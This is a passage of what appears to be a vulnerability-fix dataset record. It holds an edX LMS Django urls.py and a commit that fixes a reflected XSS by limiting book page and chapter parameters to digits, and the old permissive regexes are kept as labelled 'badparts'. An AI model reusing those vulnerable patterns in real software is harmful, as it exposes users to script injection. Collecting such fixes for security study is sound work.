                    "sourceWithComments": "from django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n            'staticbook.views.index_shifted'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.pdf_index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.html_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n"
                }
            },
            "msg": "Fix LMS-530, reflected XSS\n\nLimit the page and chapter numbers to digits, to keep malicious URL\ncomponents from being inserted onto the page.\n\nConflicts:\n\tlms/urls.py"
        },
        "5fad9ccca43cdfb565b3f80914f998afa7f2fa78": {
            "url": "https://api.github.com/repos/Dalas/edx/commits/5fad9ccca43cdfb565b3f80914f998afa7f2fa78",
            "html_url": "https://github.com/Dalas/edx/commit/5fad9ccca43cdfb565b3f80914f998afa7f2fa78",
            "sha": "5fad9ccca43cdfb565b3f80914f998afa7f2fa78",
            "keyword": "XSS malicious",
            "diff": "diff --git a/lms/urls.py b/lms/urls.py\nindex 51c6ba13b7..b131bb8f0b 100644\n--- a/lms/urls.py\n+++ b/lms/urls.py\n@@ -223,24 +223,24 @@\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n",
            "message": "",
            "files": {
                "/lms/urls.py": {
                    "changes": [
                        {
                            "diff": "\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n",
                            "add": 8,
                            "remove": 8,
                            "filename": "/lms/urls.py",
                            "badparts": [
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',"
                            ],
                            "goodparts": [
